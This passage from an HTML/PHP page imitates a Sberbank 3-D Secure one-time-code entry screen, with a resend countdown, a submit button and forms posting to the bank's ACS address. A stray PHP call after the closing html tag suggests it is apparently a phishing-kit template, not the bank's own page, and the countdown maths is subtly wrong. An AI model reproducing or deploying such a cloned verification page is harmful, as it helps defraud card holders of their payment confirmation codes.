  var x = setInterval(function() {
    // Get today's date and time
    var now = new Date().getTime();

    // Find the distance between now and the count down date
    var distance = countDownDate - now;

    // Time calculations for days, hours, minutes and seconds
    var seconds = Math.floor((distance % (1000 * 600)) / 1000);

    // Output the result in an element with id="demo"
    elm.innerHTML = "Повторная отправка кода через "+seconds+" сек.";

    // If the count down is over, write some text 
    if (distance < 0) {
      clearInterval(x);
      fn();
      elm.innerHTML = "Код был отправлен повторно";
    }
  }, 1000);

}

countDown(document.getElementById('demo'), 180, function(){
;
})

</script>
 
 <p style="border-bottom:1px solid #dedede">
 <span></span>
 <span id=timer style=color:rgb(102,102,102);display:none></span>
 </p>
 
 
 <input id=submitButton name=submitButton class=big-button type=submit value=Отправить>
 
 </div>
 </form>
 <form id=resendForm name=resendForm method=post action=https://acs5.sbrf.ru:443/acs/api/3ds/otp enctype=application/x-www-form-urlencoded>
 
 
 
 </form>
 <form id=cancelForm name=cancelForm method=post action=https://acs5.sbrf.ru:443/acs/api/3ds/otp enctype=application/x-www-form-urlencoded>
 <div class=row>
 
 
 <div class=left><a id=cancelLink href=#>Выход</a></div>
 <div class=right><a href=#><img src=data:image/gif;base64,R0lGODlhDgANAKIAAP+ZZv//zP/////MZv/Mmf8zAP+ZM/9mACH5BAAAAAAALAAAAAAOAA0AAAMreLrV+89IGEkQxFBFcA/bQQxHMQjhZFihYlxaewItR9QKENcBiRM0nAOSAAA7 class=help_icon alt=Help align=absbottom>Помощь</a></div>
 </div>
 
 </form>
 <form name=helpForm style=display:none>
 
 </form>
 <form name=cancelConfirmationForm style=display:none>
 
 </form>
</div>




</body></html>
<?php
bottom_proc('prepare_verificationphp');